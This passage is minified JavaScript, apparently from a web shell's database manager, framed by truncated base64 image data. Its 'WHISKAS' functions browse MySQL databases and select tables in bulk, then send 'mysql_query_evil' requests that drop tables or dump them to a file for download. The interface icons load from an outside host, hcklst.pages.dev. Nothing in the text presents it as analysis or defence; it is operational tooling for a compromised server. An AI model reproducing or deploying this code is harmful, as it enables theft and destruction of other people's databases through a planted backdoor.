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")}})}else if(void 0===t)for(var n in WHISKASMysqlFilterTable(null,{db_id:a,target:".mysql-tables .list_container",value:i}),o)WHISKASMysqlTableMode(a,o[n],"closed");else{var s="",c=e.getAttribute("mode");for(var n in"opened"==c?(e.setAttribute("mode","closed"),s="b_plus.png"):(e.setAttribute("mode","opened"),s="b_minus.png"),o)WHISKASMysqlTableMode(a,o[n],c);d.querySelector("#"+a+" .mysql-tables .parent-expander img").src="https://hcklst.pages.dev/menu_icon.webp"+s}}function WHISKASMysqlTableMode(e,t,a){var i=d.querySelector("#"+e+" .cls-"+t),l="";void 0===a?(l=-1!=i.classList.value.indexOf("hide-db-tables")?"b_minus.png":"b_plus.png",i.classList.toggle("hide-db-tables")):"opened"==a?(l="b_plus.png",i.classList.add("hide-db-tables")):(l="b_minus.png",i.classList.remove("hide-db-tables")),d.querySelector("#"+e+" .cls-"+t+"-expander img").src="https://hcklst.pages.dev/menu_icon.webp"+l}function WHISKASMysqlExpander(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=e.getAttribute("sql_count"),l=d.querySelector("#"+a+" .cls-"+t);"loaded"==l.getAttribute("mode")?WHISKASMysqlTableMode(a,t):WHISKASMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_get_tables",post:{WHISKAS2:"load_tables",WHISKAS3:i}},function(e){0!=e.length&&WHISKASMysqlMakeTblList(e=JSON.parse(e),l,a,t,i)})}function WHISKASMysqlTablesEvil(e){var t=e.getAttribute("target"),a=e.getAttribute("db_id"),i=e.getAttribute("mode");"checked"==i?(i=!1,e.setAttribute("mode","not")):(i=!0,e.setAttribute("mode","checked")),d.querySelectorAll("#"+a+" "+t+" input[name=tbl\\[\\]]").forEach(function(e){e.checked=i})}function WHISKASMysqlTablesDumpDrop(e){var t=e.getAttribute("target"),a=e.getAttribute("db_id"),i="none";"dump"==e.value&&(i="block"),d.querySelector("#"+a+" "+t+" .dump-file-holder").style.display=i}function WHISKASMysqlTablesDumpDropBtn(e){var t=e.getAttribute("target"),a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=[],r=d.querySelector("#"+i+" input[name=sql_count]").checked,o=d.querySelector("#"+i+" "+t),n=o.querySelector("select[name=tables_evil]").value,s=o.querySelector(".dump-file-holder input").value;d.querySelectorAll("#"+i+" "+t+" input[name=tbl\\[\\]]").forEach(function(e){e.checked&&l.push(e.value)}),l.length>0&&WHISKASMysqlApi({db_id:i,db_target:a,ajax_id:"mysql_query_evil",db_info:{tables:l,mode:n,dump_file:s},post:{WHISKAS2:"dump_drop"}},function(e){0!=e.length&&(e=JSON.parse(e),"drop"==n?WHISKASMysqlMakeTblList(e,o,i,a,r):o.querySelector(".dump-file-holder").insertAdjacentHTML("beforeend","<div><a href='javascript:void(0);' onclick='g(\"FilesTools\",null,\""+s+'","download");\'><span>Download: '+s+"</span></a></div>"))})}function WHISKASMysqlMakeTblList(e,t,a,i,l){t.setAttribute("mode","loaded");var r='<ul><li><div class="block"><i></i><b></b></div><div><input style="padding: 0;margin-left: 11px;text-align:center;" type="text" class="db-opt-id" db_id="'+a+'" placeholder="Filter Table" target=".cls-'+i+'" onkeyup="WHISKASMysqlFilterTable(this);" name="filter"></div></li>';for(var o in e)null!=e[o]&&(r+="<li><div class='block'><i></i><b></b></div><div class='tables-row'><input type='checkbox' name='tbl[]' value='"+e[o].name+"'>&nbsp;<a class='db-opt-id' db_target='"+i+"' db_id='"+a+"' href='javascript:void(0);' onclick=\"WHISKASLoadTableData(this, '"+e[o].name+"')\"><span class='mysql_tables' style='font-weight:unset;'>"+e[o].name+"</span></a>"+(l?" <small><span style='font-weight:unset;' class='mysql_table_count'>("+e[o].count+")</span></small>":"&nbsp;")+"</div></li>");r+='</ul><div style="margin-left: 26px;margin-bottom: 10px;margin-top: 10px;"><input onchange="WHISKASMysqlTablesEvil(this);" db_id="'+a+'" class="db-opt-id" target=".cls-'+i+'" type="checkbox" class="db-opt-id"><select onchange="WHISKASMysqlTablesDumpDrop(this);" class="db-opt-id" db_id="'+a+'" target=".cls-'+i+'" class="db-opt-id" name="tables_evil" style="padding: 0;width: 100px;"><option selected>drop</option><option>dump</option></select> <button onclick="WHISKASMysqlTablesDumpDropBtn(this);return false;" db_id="'+a+'" class="db-opt-id" db_target="'+i+'" target=".cls-'+i+'" class="db-opt-id">Do it</button><div class="dump-file-holder" style="display:none;margin-left:20px;margin-top: 5px;"><input style="padding: 0;text-align:center;" type="text" placeholder="dump.sql" name="dump_file"></div></div>',t.innerHTML=r,d.querySelector("#"+a+" .cls-"+i+"-expander img").src="data:image/png;base64,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